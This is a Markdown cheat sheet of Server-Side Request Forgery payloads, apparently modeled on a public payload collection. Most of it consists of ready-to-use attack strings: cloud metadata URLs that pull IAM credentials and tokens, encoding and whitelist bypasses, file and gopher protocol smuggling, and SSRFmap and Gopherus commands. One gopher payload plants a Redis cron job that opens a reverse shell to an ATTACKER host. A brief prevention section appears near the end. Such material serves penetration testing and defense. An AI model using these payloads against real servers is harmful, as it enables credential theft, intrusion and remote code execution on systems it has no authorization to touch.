# Server-Side Request Forgery (SSRF)

## Description
SSRF allows attackers to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This can be used to access internal services, scan internal networks, read local files, and exploit trust relationships.

## Basic Payloads

### Localhost Access
```
http://127.0.0.1
http://localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://[::1]
http://0.0.0.0
http://0
```

### Internal Network
```
http://192.168.0.1
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
http://192.168.0.0/24
```

## Cloud Metadata Endpoints

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 (requires token)
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### Google Cloud (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires header: Metadata-Flavor: Google
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

### Kubernetes
```
https://kubernetes.default.svc/
https://kubernetes.default/
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

## Bypass Techniques

### IP Address Encoding
```
# Decimal
http://2130706433  (127.0.0.1)
http://3232235521  (192.168.0.1)

# Octal
http://0177.0.0.1
http://0177.0000.0000.0001

# Hexadecimal
http://0x7f.0x0.0x0.0x1
http://0x7f000001

# Mixed notation
http://127.1
http://127.0.1

# IPv6
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
```

### URL Encoding
```
http://127.0.0.1 -> http://%31%32%37%2e%30%2e%30%2e%31
http://localhost -> http://%6c%6f%63%61%6c%68%6f%73%74

# Double encoding
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

### DNS Rebinding
```
# Use DNS that resolves to internal IP
http://spoofed.burpcollaborator.net
http://localtest.me  (resolves to 127.0.0.1)
http://127.0.0.1.nip.io
http://customer1.app.localhost
```

### Redirect-Based Bypass
```
# Host redirect service
https://r3dir.me/--to/?url=http://169.254.169.254/

# Shortened URLs that redirect
http://bit.ly/ssrf-internal

# Application open redirect
http://target.com/redirect?url=http://169.254.169.254/
```

### Protocol Smuggling
```
# File protocol
file:///etc/passwd
file://localhost/etc/passwd

# Gopher protocol
gopher://127.0.0.1:25/_MAIL%20FROM:attacker
gopher://127.0.0.1:6379/_SET%20key%20value

# Dict protocol
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389/
```

### Domain Confusion
```
# Using @ symbol
http://attacker.com@target.com:8080
http://localhost@attacker.com

# Subdomain
http://127.0.0.1.attacker.com
http://attacker.com.127.0.0.1
```

### Whitelist Bypass
```
# If target.com is whitelisted
http://target.com.attacker.com
http://target.com@attacker.com
http://attacker.com#target.com
http://attacker.com?target.com
http://target.com%00.attacker.com
```

## Protocol Exploitation

### Gopher Protocol
```bash
# Generate gopher payload
# For Redis
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -c "sh -i >& /dev/tcp/ATTACKER/PORT 0>&1"%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a%0a
```

### SMTP via Gopher
```
gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@example.com>%0ARCPT%20TO:<victim@target.com>%0ADATA%0ASubject:SSRF%0A%0ASSRF%20Attack%0A.%0AQUIT
```

## Blind SSRF

### Out-of-Band Detection
```bash
# Burp Collaborator
http://YOUR-SUBDOMAIN.burpcollaborator.net

# Interactsh
http://unique-id.oast.fun

# RequestBin
http://requestbin.net/r/your-bin
```

### Time-Based Detection
```bash
# Slow internal IP (timeout difference)
http://192.168.1.1:9999  # Non-existent service
http://10.0.0.1:1       # Slow response
```

## Tools

### SSRFmap
```bash
# https://github.com/swisskyrepo/SSRFmap
python ssrfmap.py -r request.txt -p url -m readfiles
python ssrfmap.py -r request.txt -p url -m portscan
```

### Gopherus
```bash
# Generate gopher payloads
# https://github.com/tarunkant/Gopherus

python gopherus.py --exploit mysql
python gopherus.py --exploit redis
python gopherus.py --exploit fastcgi
```

### Manual Testing
```bash
# Test various endpoints
curl -X POST "https://target.com/fetch" -d "url=http://127.0.0.1:8080"
curl -X POST "https://target.com/fetch" -d "url=http://169.254.169.254/latest/"
```

## Common Vulnerable Parameters
```
url=
uri=
path=
dest=
redirect=
uri=
path=
continue=
url=
window=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

## Testing Checklist

- [ ] Test localhost variations (127.0.0.1, localhost, 0.0.0.0)
- [ ] Test cloud metadata endpoints
- [ ] Test internal network ranges
- [ ] Try IP encoding bypasses
- [ ] Try URL encoding bypasses
- [ ] Test protocol handlers (file, gopher, dict)
- [ ] Test DNS rebinding
- [ ] Test redirect-based bypass
- [ ] Check for blind SSRF with OOB callbacks
- [ ] Test Kubernetes endpoints if applicable

## Prevention

```python
# Allowlist approach
ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']

def validate_url(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")

# Block internal IPs
import ipaddress

def is_internal(ip):
    addr = ipaddress.ip_address(ip)
    return addr.is_private or addr.is_loopback or addr.is_link_local

# Use DNS resolution with validation
import socket

def safe_request(url):
    hostname = urlparse(url).hostname
    ip = socket.gethostbyname(hostname)
    if is_internal(ip):
        raise ValueError("Internal IP not allowed")
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- https://portswigger.net/web-security/ssrf
- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
